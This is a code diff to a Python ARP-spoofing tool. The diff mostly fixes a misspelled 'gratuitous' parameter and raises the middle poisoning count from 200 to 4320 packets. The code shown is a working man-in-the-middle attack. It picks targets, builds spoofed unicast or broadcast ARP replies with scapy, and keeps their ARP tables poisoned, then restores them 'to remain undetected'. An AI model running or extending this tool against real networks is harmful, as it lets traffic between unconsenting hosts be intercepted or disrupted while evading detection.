@@ -12,7 +12,7 @@ import spoofing_tool as spoof
 
 # number of packets sent in each poisoning phase
 START_COUNT = 5 # to start poisoning
-MIDDLE_COUNT = 200 # to keep poisoning 
+MIDDLE_COUNT = 4320 # to keep poisoning 
 END_COUNT = 3 # to unpoison
 
 # interval (in seconds) to send each packet of each phase
@@ -27,7 +27,7 @@ ONE_WAY_TOKEN = "__ONE_WAY_TOKEN__"
 ### FUNCTIONS ###
 
 # Main function that runs the ARP attack
-def arp_spoofing(gratuitious):
+def arp_spoofing(gratuitous):
     # clear terminal and begin keeping track of previous displayed text for UI
     spoof.clear()
     previous_tuples = []
@@ -52,7 +52,7 @@ def arp_spoofing(gratuitious):
 
     # begin the attack by setting this machine as the 'attacker'
     my_details = sh.get_my_details(iface)
-    two_way_arp_procedure(targets, my_details["mac"], my_details["ip"], iface, gratuitious)
+    two_way_arp_procedure(targets, my_details["mac"], my_details["ip"], iface, gratuitous)
 
 # Function to let the user pick number of targets and 
 # which ip's they are out of the active hosts.
@@ -102,7 +102,7 @@ def choose_arp_targets(active_hosts, previous_tuples):
 # Function for poisoning the arp tables of multiple {@targets}
 # such that each target thinks the attacker's mac address
 # corresponds to the ip's of every other target 
-def two_way_arp_procedure(targets, macAtk, ipAtk, iface, gratuitious):
+def two_way_arp_procedure(targets, macAtk, ipAtk, iface, gratuitous):
     spoof.clear()
     spoof.printf("Spoofing the connection between", 0)
 
@@ -123,7 +123,7 @@ def two_way_arp_procedure(targets, macAtk, ipAtk, iface, gratuitious):
 
     # send reply packets to keep repoisong
     spoof.printf("Poisoning initiated.", 4)
-    poison_m_times_every_n_secs(MIDDLE_COUNT, MIDDLE_INTERVAL, time.time(), True, targets, macAtk, ipAtk, iface, 2, gratuitious)
+    poison_m_times_every_n_secs(MIDDLE_COUNT, MIDDLE_INTERVAL, time.time(), True, targets, macAtk, ipAtk, iface, 2, gratuitous)
 
     # at the end restore the arp tables of all targets to normal to remain undetected 
     spoof.printf("Stopping poisoning!!! (Do not kill the program)", 4)
@@ -136,9 +136,9 @@ def one_way_arp_start(macT1, ipT1, ipT2, macAtk, ipAtk, iface):
     poison_m_times_every_n_secs(START_COUNT, START_INTERVAL, time.time() - START_INTERVAL, True, targets, macAtk, ipAtk, iface, 1)
 
 # keep the arp table of 'T1' poisoned with reply packets
-def one_way_arp(macT1, ipT1, ipT2, macAtk, ipAtk, iface, pkt_type, gratuitious):
+def one_way_arp(macT1, ipT1, ipT2, macAtk, ipAtk, iface, pkt_type, gratuitous):
     targets = [(macT1, ipT1), (ONE_WAY_TOKEN, ipT2)]
-    arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitious)
+    arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitous)
 
 # unpoison the arp table of target 'T1' to remain undetected
 def one_way_arp_end(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface):
@@ -150,18 +150,18 @@ def one_way_arp_end(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface):
 #  
 # @param should_poison - boolean to determine if it is poisoning or unpoisoning (True = poison, False = unpoison)
 # @param pkt_type - the type of packets to be sent (1 = request, 2 = reply)
-def poison_m_times_every_n_secs(m, n, last_sent_time, should_poison, targets, macAtk, ipAtk, iface, pkt_type, gratuitious=False):
+def poison_m_times_every_n_secs(m, n, last_sent_time, should_poison, targets, macAtk, ipAtk, iface, pkt_type, gratuitous=False):
     while m > 0:
         if time.time() - last_sent_time > n: # if n seconds have passed => should poison/unpoison again
             if should_poison:
-                arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitious)
+                arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitous)
             else:
                 arp_unpoison(targets, macAtk, ipAtk, iface, pkt_type)     
             last_sent_time = time.time()
             m -= 1
 
 # Function to poison the arp tables of all targets 
-def arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitious):
+def arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitous):
     for i in range(len(targets) - 1):
         for j in range(i + 1, len(targets)):
             # get the targets details
@@ -172,11 +172,11 @@ def arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitious):
 
             # either one-way or bi-directional poisoning based on the mac addresses of the targets
             if macT2 == ONE_WAY_TOKEN:
-                send_one_directional(macT1, ipT1, ipT2, macAtk, iface, pkt_type, gratuitious)
+                send_one_directional(macT1, ipT1, ipT2, macAtk, iface, pkt_type, gratuitous)
             elif macT1 == ONE_WAY_TOKEN:
-                send_one_directional(macT2, ipT2, ipT1, macAtk, iface, pkt_type, gratuitious)
+                send_one_directional(macT2, ipT2, ipT1, macAtk, iface, pkt_type, gratuitous)
             else:
-                send_bi_directional(ipT2, macT2, ipT1, macT1, macAtk, macAtk, iface, pkt_type, gratuitious)
+                send_bi_directional(ipT2, macT2, ipT1, macT1, macAtk, macAtk, iface, pkt_type, gratuitous)
 
 # Function to unpoison the arp tables of all targets 
 def arp_unpoison(targets, macAtk, ipAtk, iface, pkt_type):
@@ -198,9 +198,9 @@ def arp_unpoison(targets, macAtk, ipAtk, iface, pkt_type):
 
 # Function to build and send an arp packet 
 # spoofing the ARP table of target T1 to think that the attacker is target T2 .
-def send_one_directional(_macT1, _ipT1, _ipT2, _macAtk, _iface, pkt_type, gratuitious):
+def send_one_directional(_macT1, _ipT1, _ipT2, _macAtk, _iface, pkt_type, gratuitous):
     # poison ARP table of the target
-    arp_t = build_packet(_macAtk, _ipT2, _macT1, _ipT1, pkt_type, gratuitious)
+    arp_t = build_packet(_macAtk, _ipT2, _macT1, _ipT1, pkt_type, gratuitous)
 
     # send the packet
     sendp(arp_t, iface=_iface)
@@ -208,32 +208,32 @@ def send_one_directional(_macT1, _ipT1, _ipT2, _macAtk, _iface, pkt_type, gratui
 # Function to build and send an arp packet 
 # spoofing the ARP table of target T1 to think that the attacker is target T2
 # and the ARP table of target 2 to think that the attacker is target T1.
-def send_bi_directional(_ipM2, _macM2, _ipM1, _macM1, _macM31, _macM32, _iface, pkt_type, gratuitious):
+def send_bi_directional(_ipM2, _macM2, _ipM1, _macM1, _macM31, _macM32, _iface, pkt_type, gratuitous):
     # poison ARP table of T1
-    arp_m1 = build_packet(_macM31, _ipM2, _macM1, _ipM1, pkt_type, gratuitious)
+    arp_m1 = build_packet(_macM31, _ipM2, _macM1, _ipM1, pkt_type, gratuitous)
     # poison ARP table of T2
-    arp_m2 = build_packet(_macM32, _ipM1, _macM2, _ipM2, pkt_type, gratuitious)
+    arp_m2 = build_packet(_macM32, _ipM1, _macM2, _ipM2, pkt_type, gratuitous)
 
     # send the packets
     sendp([arp_m1, arp_m2], iface=_iface)
 
 # Function to build a malicious/spoofed packet
-# such that if it should not be gratuitious 
+# such that if it should not be gratuitous 
 #       then the packet is sent from the MAC of the attacker and the spoofed IP
 #       to the MAC and IP of the victim
-# otherwise when it should be gratuitious
+# otherwise when it should be gratuitous
 #       then the packet is sent from the MAC of the attacker and the spoofed IP
 #       to the broadcast MAC and the spoofed IP
 # 
-# @param gratuitious - if True then broadcast the ARP queries
+# @param gratuitous - if True then broadcast the ARP queries
 # @param pkt_type - the type of packets to be sent (1 = request, 2 = reply)
-def build_packet(macAttacker, ipToSpoof, macVictim, ipVictim, pkt_type, gratuitious):
+def build_packet(macAttacker, ipToSpoof, macVictim, ipVictim, pkt_type, gratuitous):
     packet = Ether() / ARP()
     packet[Ether].src = macAttacker
     packet[ARP].hwsrc = macAttacker # Send the MAC address of the attacker
     packet[ARP].psrc  = ipToSpoof   # as the spoofed IP address.
 
-    if gratuitious:
+    if gratuitous:
         packet[Ether].dst = "ff:ff:ff:ff:ff:ff"
         packet[ARP].hwdst = "ff:ff:ff:ff:ff:ff"
         packet[ARP].pdst  = ipToSpoof
